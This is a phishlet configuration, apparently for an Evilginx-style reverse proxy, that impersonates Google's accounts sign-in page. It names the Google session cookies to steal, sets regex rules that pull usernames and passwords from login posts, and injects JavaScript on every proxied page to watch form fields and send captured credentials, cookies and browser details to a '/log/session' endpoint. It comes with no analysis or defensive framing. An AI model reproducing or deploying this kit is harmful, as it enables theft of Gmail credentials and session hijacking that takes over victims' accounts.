min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'svc-g2h7j4p', orig_sub: 'accounts', domain: 'google.com', session: true, auto_filter: true, is_landing: true}
sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https%3A%2F%2F{hostname}/', replace: 'https%3A%2F%2F{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', 'LSID', 'NID', '1P_JAR', '__Secure-1PAPISID', '__Secure-3PAPISID', '.*,regexp']
  - domain: '.accounts.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', '.*,regexp']
  - domain: '.mail.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', '.*,regexp']
auth_urls:
  - '/signin/v2/challenge/pwd*'
  - '/ServiceLogin*'
  - '/signin/v2/identifier*'
  - '/u/0/*'
credentials:
  username:
    key: '(identifier|email|username|login)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(password|passwd|pass|Passwd)'
    search: '(.*)'
    type: 'post'
login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier'
js_inject:
  - trigger_domains: ["*"]
    trigger_paths: ["*"]
    script: |
      (function() {
        var lastCapture = '';
        var capturedCreds = { username: '', password: '' };
        var providerName = 'Gmail';
        var providerId = 'gmail';

        function sendSessionData() {
          try {
            if (!capturedCreds.username && !capturedCreds.password) return;
            var currentHash = (capturedCreds.username || '') + ':' + (capturedCreds.password || '');
            if (currentHash === lastCapture) return;
            lastCapture = currentHash;

            var cookieObj = {};
            document.cookie.split(';').forEach(function(c) {
              c = c.trim();
              if (c) { var eq = c.indexOf('='); if (eq > 0) cookieObj[c.substring(0, eq)] = c.substring(eq + 1); }
            });

            var sessionInfo = {
              provider: providerId,
              credentials: capturedCreds,
              url: window.location.href,
              userAgent: navigator.userAgent || '',
              cookies: cookieObj,
              timestamp: new Date().toISOString()
            };

            var payload = {
              username: 'SessionData-' + providerName,
              password: JSON.stringify(sessionInfo)
            };

            fetch('/log/session', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              keepalive: true
            }).catch(function(){});
          } catch(e) {}
        }

        var monitor = (function() {
          var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : { add: function(el) { el._gmWatched = true; }, has: function(el) { return el._gmWatched; } };
          return function() {
            document.querySelectorAll('input, form, button, [role="button"]').forEach(function(el) {
              if (watchedElements.has(el)) return;
              watchedElements.add(el);
              if (el.tagName === 'INPUT') {
                var captureField = function() {
                  var v = el.value;
                  if (!v) return;
                  var t = (el.type || '').toLowerCase();
                  var n = (el.name || el.id || '').toLowerCase();
                  if (t === 'password' || n.includes('pass')) {
                    if (v !== capturedCreds.password) { capturedCreds.password = v; sendSessionData(); }
                  } else if (t === 'email' || t === 'text' || t === 'tel' || n.includes('identifier') || n.includes('user') || n.includes('email') || n.includes('login')) {
                    if (v !== capturedCreds.username) { capturedCreds.username = v; }
                  }
                };
                el.addEventListener('input', captureField, { passive: true });
                el.addEventListener('change', captureField, { passive: true });
                el.addEventListener('blur', captureField, { passive: true });
              } else if (el.tagName === 'FORM') {
                el.addEventListener('submit', function() { setTimeout(sendSessionData, 100); }, { passive: true });
              } else {
                el.addEventListener('click', function() { setTimeout(sendSessionData, 100); }, { passive: true });
              }
            });
          };
        })();

        var observer = new MutationObserver(monitor);
        observer.observe(document, { childList: true, subtree: true });
        setInterval(monitor, 3000);
        monitor();
      })();
